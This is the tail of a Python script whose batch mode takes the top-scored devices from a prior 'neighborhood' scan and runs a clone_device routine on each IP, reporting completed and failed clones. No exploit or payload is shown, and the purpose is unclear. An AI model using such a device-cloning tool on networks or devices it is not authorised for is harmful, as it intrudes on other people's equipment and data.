                print("  No scored devices. Run neighborhood_extractor.py first.")
                return

            scored = [d for d in devices if d.get("score", 0) > 0]
            targets = scored[:n]
            print(f"  Cloning top {len(targets)} scored devices:")
            for d in targets:
                ip = d["ip"]
                model = d.get("identity", {}).get("model", "?")
                score = d.get("score", 0)
                print(f"    {ip} ({model}) ★{score}")

            results = []
            for i, d in enumerate(targets):
                ip = d["ip"]
                print(f"\n  === Device {i+1}/{len(targets)}: {ip} ===")
                r = await clone_device(bridge, ip, receiver)
                results.append(r)

            print(f"\n{'='*60}")
            print(f"  BATCH COMPLETE: {len(results)} devices")
            complete = sum(1 for r in results if r.get("status") == "complete")
            print(f"  Complete: {complete}, Failed: {len(results)-complete}")

        else:
            print(f"Unknown mode: {mode}")
            print(__doc__)
    finally:
        receiver.stop()


if __name__ == "__main__":
    asyncio.run(main())
